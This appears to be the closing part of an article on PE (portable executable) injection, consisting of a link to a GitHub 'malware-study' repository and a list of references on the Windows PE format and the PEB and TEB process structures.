malware-study/PEInjection at main · captain-woof/malware-study
--------------------------------------------------------------

### My projects to understand malware development and detection. Use responsibly. I'm not responsible if you cause…

github.com



](https://github.com/captain-woof/malware-study/tree/main/PEInjection?source=post_page-----30e10cd88abc---------------------------------------)

References
----------

*   [https://learn.microsoft.com/en-us/windows/win32/debug/pe-format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
*   [https://tech-zealots.com/malware-analysis/pe-portable-executable-structure-malware-analysis-part-2/](https://tech-zealots.com/malware-analysis/pe-portable-executable-structure-malware-analysis-part-2/)
*   [https://0xrick.github.io/win-internals/pe7/](https://0xrick.github.io/win-internals/pe7/)
*   [https://0xrick.github.io/win-internals/pe6/](https://0xrick.github.io/win-internals/pe6/)
*   [https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
*   [https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb)
